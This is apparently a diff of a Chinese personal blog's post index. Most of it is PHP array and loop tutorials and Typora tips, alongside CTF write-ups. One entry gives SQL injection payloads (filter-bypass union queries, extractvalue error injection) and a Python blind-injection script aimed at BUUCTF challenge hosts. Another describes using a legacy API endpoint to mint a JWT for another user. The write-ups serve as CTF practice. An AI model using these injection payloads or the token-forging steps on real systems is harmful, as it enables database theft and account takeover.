-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;124&#x27;=&gt;&#x27;a&#x27;,&#x27;125&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">asort($h);  //对数组进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [124] =&gt; a [125] =&gt; c [123] =&gt; f )</span><br></pre></td></tr></table></figure>
-
-<p><strong>ksort()根据数组的键，对数组进行升序排列</strong></p>
-<p><strong>krsort()根据数组的键，对数组进行降序排列</strong></p>
-<p>一般用于关联数组</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;125&#x27;=&gt;&#x27;a&#x27;,&#x27;124&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">ksort($h);  //进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [123] =&gt; f [124] =&gt; c [125] =&gt; a )</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-快速生成数组"><a href="#6-快速生成数组" class="headerlink" title="6.快速生成数组"></a>6.快速生成数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=range(1,10);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 [6] =&gt; 7 [7] =&gt; 8 [8] =&gt; 9 [9] =&gt; 10 )</span><br></pre></td></tr></table></figure>
-
-<h4 id="7-添加数组元素函数"><a href="#7-添加数组元素函数" class="headerlink" title="7.添加数组元素函数"></a>7.添加数组元素函数</h4><p><strong>array_unshift()是在数组的头部添加元素</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_unshift($h,17);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 17 [1] =&gt; 12 [2] =&gt; 13 [3] =&gt; 14 )</span><br></pre></td></tr></table></figure>
-
-<p><strong>array_push() 在数组尾部添加元素</strong></p>
-<h4 id="8-删除数组元素函数"><a href="#8-删除数组元素函数" class="headerlink" title="8.删除数组元素函数"></a>8.删除数组元素函数</h4><p><strong>array_shift()是删除头部数组元素</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_shift($h);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 13 [1] =&gt; 14 )</span><br></pre></td></tr></table></figure>
-
-<p><strong>array_pop()是删除尾部数组元素</strong></p>
-<p><strong>array_splice()是可以规定删除数组元素的位置</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_splice($input, 2);  //是将$input数组从键名为2的元素删除到最后</span><br><span class="line">array_splice($input, 1, 2);  //是将$input数组从键名为1到2的元素删除</span><br><span class="line"></span><br><span class="line">array_splice($input, 1, -1, array(&quot;black&quot;, &quot;maroon&quot;));</span><br><span class="line">比如$input = array(&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;);</span><br><span class="line">那么会输出array(4) &#123; [0]=&gt; string(3) &quot;red&quot; [1]=&gt; string(5) &quot;black&quot; [2]=&gt; string(6) &quot;maroon&quot; [3]=&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="9-删除键值操作函数"><a href="#9-删除键值操作函数" class="headerlink" title="9.删除键值操作函数"></a>9.删除键值操作函数</h4><p><strong>array_keys() 获取数组的键组成的数组</strong></p>
-<p><strong>array_values() 返回数组中所有的值，并给其重新建立数字索引</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_keys($h);</span><br><span class="line">print_r($j);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; 123 [1] =&gt; 124 [2] =&gt; 125 )</span><br></pre></td></tr></table></figure>
-
-<p><strong>array_key_exists()判断数组的键名或索引是否存在</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_key_exists(&quot;12&quot;,$h);</span><br><span class="line">echo $j?&quot;存在&quot;:&quot;不存在&quot;;</span><br><span class="line"></span><br><span class="line">输出不存在</span><br></pre></td></tr></table></figure>
-
-<p><strong>array_search()  在数组中搜索给定的值，返回该值对应的索引</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">echo array_search(&#x27;wo&#x27;,$h);  //只能搜索值，返回索引</span><br><span class="line"></span><br><span class="line">输出  123</span><br></pre></td></tr></table></figure>
-
-<p><strong>in_array() 检查数组中是否存在某个值，存在返回true 否则false</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出  found</span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
     <title>循环用法</title>
     <url>/2022/10/27/%E5%BE%AA%E7%8E%AF/</url>
     <content><![CDATA[<p>php循环的用法</p>
@@ -1811,6 +1624,193 @@
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出</span><br><span class="line">1*1=1   </span><br><span class="line">1*2=2   2*2=4   </span><br><span class="line">1*3=3   2*3=6   3*3=9   </span><br><span class="line">1*4=4   2*4=8   3*4=12   4*4=16   </span><br><span class="line">1*5=5   2*5=10   3*5=15   4*5=20   5*5=25   </span><br><span class="line">1*6=6   2*6=12   3*6=18   4*6=24   5*6=30   6*6=36   </span><br><span class="line">1*7=7   2*7=14   3*7=21   4*7=28   5*7=35   6*7=42   7*7=49   </span><br><span class="line">1*8=8   2*8=16   3*8=24   4*8=32   5*8=40   6*8=48   7*8=56   8*8=64   </span><br><span class="line">1*9=9   2*9=18   3*9=27   4*9=36   5*9=45   6*9=54   7*9=63   8*9=72   9*9=81 </span><br></pre></td></tr></table></figure></li>
 </ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>Typora用法</title>
+    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Typora基本用法</p>
+<span id="more"></span>
+
+<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
+
+<p>红色的代码是#ff0000</p>
+<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>buu的SQL</title>
+    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<p>[极客大挑战 2019]LoveSQL	[极客大挑战 2019]BabySQL	[极客大挑战 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 华北赛区 Day2 Web1]Hack World</p>
+<span id="more"></span>
+
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>1.先使用万能密码1’ or 1&#x3D;1#进行尝试查看是否有回显，查看存在回显</p>
+<p>2.查看字段数，使用order by或者union select，因为是在http行进行的输入#注释无法使用，所以使用%23来进行注释</p>
+<p>3.经过试验有3个字段，然后进行联合注入即可</p>
+<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>1.经过试验存在union，select，or，注释符，and，from，where及其他过滤，但是可以使用%23进行注释，这里可以都是用双写绕过</p>
+<p>2.使用万能密码，存在回显</p>
+<p>3.使用联合注入check.php?username&#x3D;1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123来爆出所有的库</p>
+<p>4.选用ctf库，进行爆表名为flag，再爆字段也为flag</p>
+<p>5.最后爆数据</p>
+<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>1.存在空格，union，and，&#x3D;，过滤</p>
+<p>2.使用报错型注入，注入时的语句不可以带有空格，使用check.php?username&#x3D;1&amp;password&#x3D;1’or(extractvalue(1,concat(0x7e,(select(database())))))%23来爆出数据库</p>
+<p>3.然后继续使用报错型注入来爆表，字段，</p>
+<p>4.获得数据时flag无法显示完全，使用left()和right()函数来获得全部数据，例如group_concat(right(password,32))</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()和right()函数用法</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_string可以是文字字符串，变量或列。</span><br><span class="line">number_of_characters是一个正整数，指定将返回input_string的字符数。</span><br></pre></td></tr></table></figure>
+
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.存在()过滤，使用union盲注</p>
+<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>1.该关是盲注，并且存在过滤，打开网页上已经提示flag在flag表的flag列</p>
+<p>2.输入1发现返回Hello, glzjin wants a girlfriend.输入2返回Do you want to be my girlfriend?</p>
+<p>3.利用1和2返回的值进行构造if(substr((select(flag)from(flag)),1,1)&#x3D;’’,1,2)如果正确就会返回输入1时的内容，不正确就会返回输入2时的内容</p>
+<p>4.然后写盲注脚本(有点小问题)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>数组</title>
+    <url>/2022/11/11/%E6%95%B0%E7%BB%84/</url>
+    <content><![CDATA[<p>php数组的用法</p>
+<span id="more"></span>
+
+<h4 id="1-索引数组"><a href="#1-索引数组" class="headerlink" title="1.索引数组"></a>1.索引数组</h4><p><strong>将数组全部输出</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [0]=&gt; string(2) &quot;wo&quot; [1]=&gt; string(3) &quot;shi&quot; [2]=&gt; string(4) &quot;shei&quot; &#125;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; wo [1] =&gt; shi [2] =&gt; shei )</span><br></pre></td></tr></table></figure>
+
+<p><strong>也可以将数组中特定的键值输出</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo $h[0];   //echo可以改成print_r或者var_dump</span><br><span class="line"></span><br><span class="line">输出   wo</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>count()函数用于返回数组的长度（元素数）</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo count($h);</span><br><span class="line"></span><br><span class="line">输出3，因为$h数组中有3个元素</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-关联数组"><a href="#2-关联数组" class="headerlink" title="2.关联数组"></a>2.关联数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);  //&quot;键名&quot;=&gt;&quot;键值&quot;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [&quot;wo&quot;]=&gt; string(2) &quot;35&quot; [&quot;shi&quot;]=&gt; string(2) &quot;45&quot; [&quot;shei&quot;]=&gt; string(2) &quot;55&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>将特定的键值输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);</span><br><span class="line">echo $h[&#x27;wo&#x27;];</span><br><span class="line"></span><br><span class="line">输出  35</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-多维数组"><a href="#3-多维数组" class="headerlink" title="3.多维数组"></a>3.多维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二维数组</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">print_r($h);</span><br></pre></td></tr></table></figure>
+
+<p>将特定的键值输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">echo $h[1][&#x27;12&#x27;];</span><br><span class="line"></span><br><span class="line">输出  12</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-list-函数"><a href="#4-list-函数" class="headerlink" title="4.list()函数"></a>4.list()函数</h4><p>把数组中的值赋给一些变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span><br><span class="line">list($one,$two,$three)=$h;</span><br><span class="line">echo $one.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $two.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $three;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-数组的排序"><a href="#5-数组的排序" class="headerlink" title="5.数组的排序"></a>5.数组的排序</h4><p><strong>sort()对数组进行升序排列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">sort($h);   //会按照字母的顺序进行排序，这里是按照正的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; bmw [1] =&gt; toyota [2] =&gt; volvo )</span><br></pre></td></tr></table></figure>
+
+<p><strong>rsort()对数组进行降序排列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">rsort($h);   //会按照字母的顺序进行排序，这里是按照反的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; volvo [1] =&gt; toyota [2] =&gt; bmw )</span><br></pre></td></tr></table></figure>
+
+<p><strong>asort()根据数组的值，对数组进行升序排列</strong></p>
+<p><strong>arsort()根据数组的值，对数组进行降序排列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;124&#x27;=&gt;&#x27;a&#x27;,&#x27;125&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">asort($h);  //对数组进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [124] =&gt; a [125] =&gt; c [123] =&gt; f )</span><br></pre></td></tr></table></figure>
+
+<p><strong>ksort()根据数组的键，对数组进行升序排列</strong></p>
+<p><strong>krsort()根据数组的键，对数组进行降序排列</strong></p>
+<p>一般用于关联数组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;125&#x27;=&gt;&#x27;a&#x27;,&#x27;124&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">ksort($h);  //进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [123] =&gt; f [124] =&gt; c [125] =&gt; a )</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-快速生成数组"><a href="#6-快速生成数组" class="headerlink" title="6.快速生成数组"></a>6.快速生成数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=range(1,10);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 [6] =&gt; 7 [7] =&gt; 8 [8] =&gt; 9 [9] =&gt; 10 )</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-添加数组元素函数"><a href="#7-添加数组元素函数" class="headerlink" title="7.添加数组元素函数"></a>7.添加数组元素函数</h4><p><strong>array_unshift()是在数组的头部添加元素</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_unshift($h,17);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 17 [1] =&gt; 12 [2] =&gt; 13 [3] =&gt; 14 )</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_push() 在数组尾部添加元素</strong></p>
+<h4 id="8-删除数组元素函数"><a href="#8-删除数组元素函数" class="headerlink" title="8.删除数组元素函数"></a>8.删除数组元素函数</h4><p><strong>array_shift()是删除头部数组元素</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_shift($h);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 13 [1] =&gt; 14 )</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_pop()是删除尾部数组元素</strong></p>
+<p><strong>array_splice()是可以规定删除数组元素的位置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_splice($input, 2);  //是将$input数组从键名为2的元素删除到最后</span><br><span class="line">array_splice($input, 1, 2);  //是将$input数组从键名为1到2的元素删除</span><br><span class="line"></span><br><span class="line">array_splice($input, 1, -1, array(&quot;black&quot;, &quot;maroon&quot;));</span><br><span class="line">比如$input = array(&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;);</span><br><span class="line">那么会输出array(4) &#123; [0]=&gt; string(3) &quot;red&quot; [1]=&gt; string(5) &quot;black&quot; [2]=&gt; string(6) &quot;maroon&quot; [3]=&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-删除键值操作函数"><a href="#9-删除键值操作函数" class="headerlink" title="9.删除键值操作函数"></a>9.删除键值操作函数</h4><p><strong>array_keys() 获取数组的键组成的数组</strong></p>
+<p><strong>array_values() 返回数组中所有的值，并给其重新建立数字索引</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_keys($h);</span><br><span class="line">print_r($j);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; 123 [1] =&gt; 124 [2] =&gt; 125 )</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_key_exists()判断数组的键名或索引是否存在</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_key_exists(&quot;12&quot;,$h);</span><br><span class="line">echo $j?&quot;存在&quot;:&quot;不存在&quot;;</span><br><span class="line"></span><br><span class="line">输出不存在</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_search()  在数组中搜索给定的值，返回该值对应的索引</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">echo array_search(&#x27;wo&#x27;,$h);  //只能搜索值，返回索引</span><br><span class="line"></span><br><span class="line">输出  123</span><br></pre></td></tr></table></figure>
+
+<p><strong>in_array() 检查数组中是否存在某个值，存在返回true 否则false</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出  found</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
+    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
+    <content><![CDATA[<p>My Vouchers Repo</p>
+<span id="more"></span>
+
+<meta name="referrer" content="no-referrer">
+
+<p>打开页面就是一个登录和注册界面</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
+<p>那就先注册一个，一个是home界面，还有一个是优惠卷界面</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
+<p>根据题目给你信息，应该是要登录用户名为<code>john</code>的用户，然后在源代码处的<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>中看到</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
+<p>这样知道了是在header头<code>Authorization</code>处有用户登录信息，然后就是想办法伪造一个用户名是<code>john</code>的用户，这个是jwt，但是找不到密钥，还在源代码中找到一个api接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
+
+<p>扫描目录发现还有一个<code>api/v1</code>接口，但是显示<code>not found</code>，接下来就不会做了，然后就看别人给的hint，发现api&#x2F;v1是可以打开的</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
+<p>这个有一个<code>/refresh_token</code>，所以在url为一下界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>
+
+<p>使用json传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样可以回显一个用户名为john的token，然后在url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
+
+<p>header头中的<code>Authorization</code>中输入<code>Bearer 用户名为john的token</code>就可以得到flag</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>php的类</title>
+    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<p>PHP类的基本操作</p>
+<span id="more"></span>
+
+<h4 id="1-类的继承"><a href="#1-类的继承" class="headerlink" title="1.类的继承"></a>1.类的继承</h4><p>extends关键字</p>
